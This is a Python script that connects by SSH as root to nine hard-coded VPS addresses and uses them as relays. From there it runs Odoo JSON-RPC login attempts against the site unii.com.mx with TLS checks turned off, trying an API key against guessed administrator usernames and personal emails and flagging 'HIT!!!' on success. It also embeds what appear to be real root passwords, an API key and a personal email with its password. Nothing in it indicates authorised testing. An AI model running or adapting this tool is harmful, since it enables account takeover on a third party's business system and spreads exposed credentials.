"""SSH into VPS and test Odoo API key auth"""
import paramiko, sys, time

VPSES = [
    ("82.27.100.115", "37W92I_Wd9581g5j1g1LzI"),
    ("80.96.58.99", "xviwKHoa3B9E4VJL7K"),
    ("82.27.100.70", "4C7m8To84D"),
    ("82.27.100.186", "tz7oBy7mmA"),
    ("82.27.100.150", "4rpXLXZHyt"),
    ("46.16.34.175", "uf2NSMpdXaBYs4Ejx3"),
    ("82.27.100.164", "7j1ct4T5_3y8A64zu93ks4"),
    ("45.134.9.164", "y5DQ88858952sA_2n8nVTy"),
    ("45.134.9.121", "8j1I8y39_n4MR61W3NF1Ns"),
]

SCRIPT = r'''python3 -c "
import json, sys
try:
    from urllib.request import Request, urlopen
    from urllib.error import URLError
except:
    from urllib2 import Request, urlopen, URLError
import ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE = 'https://unii.com.mx'
DB = 'unii'
APIKEY = '9242f55eec6e9ffcb167ca16751f797a204eb604'

USERS = [
    'luishmatag1@gmail.com', 'admin', 'administrator',
    'admin@unii.com.mx', 'admin@unimex.com.mx', 'sgarcia',
    'sergio.garcia@unimex.com.mx', 'soporte@unimex.com.mx',
    'vortem', 'root', 'sistema',
]

def rpc(service, method, args):
    payload = json.dumps({
        'jsonrpc': '2.0', 'id': 1, 'method': 'call',
        'params': {'service': service, 'method': method, 'args': args}
    }).encode()
    req = Request(BASE + '/jsonrpc', data=payload,
                  headers={'Content-Type': 'application/json'})
    resp = urlopen(req, timeout=20, context=ctx)
    return json.loads(resp.read().decode())

# Version check
try:
    v = rpc('common', 'version', [])
    ver = v.get('result', {}).get('server_version', '?')
    print('Odoo version:', ver)
except Exception as e:
    print('VERSION ERROR:', e)
    sys.exit(1)

# Auth test with API key
print('\\nTesting API key auth:')
for user in USERS:
    try:
        r = rpc('common', 'login', [DB, user, APIKEY])
        uid = r.get('result')
        err = r.get('error')
        if uid and uid is not False and uid != 0:
            print('  HIT!!!', user, '-> UID=', uid)
        elif err:
            emsg = str(err.get('data', {}).get('message', err))[:120]
            print('  err', user, '->', emsg)
        else:
            print('  ---', user, '->', uid)
    except Exception as e:
        print('  exc', user, '->', e)

# Also test known cred
print('\\nKnown cred test:')
try:
    r = rpc('common', 'login', [DB, 'luishmatag1@gmail.com', 'Gallito3690'])
    uid = r.get('result')
    print('  luishmatag1 original ->', 'UID=' + str(uid) if uid else 'FALSE')
except Exception as e:
    print('  exc:', e)

print('\\nDone')
"
'''

for ip, pw in VPSES:
    print(f"\n[*] Trying VPS {ip}...")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username="root", password=pw, timeout=10, 
                       look_for_keys=False, allow_agent=False)
        print(f"[+] Connected to {ip}!")
        
        stdin, stdout, stderr = client.exec_command(SCRIPT, timeout=90)
        out = stdout.read().decode(errors="replace")
        err = stderr.read().decode(errors="replace")
        
        print(out)
        if err:
            print(f"  STDERR: {err[:500]}")
        
        client.close()
        sys.exit(0)
        
    except paramiko.AuthenticationException:
        print(f"  [-] Auth failed")
    except Exception as e:
        print(f"  [-] {e}")

print("\n[!] No VPS available. All failed.")
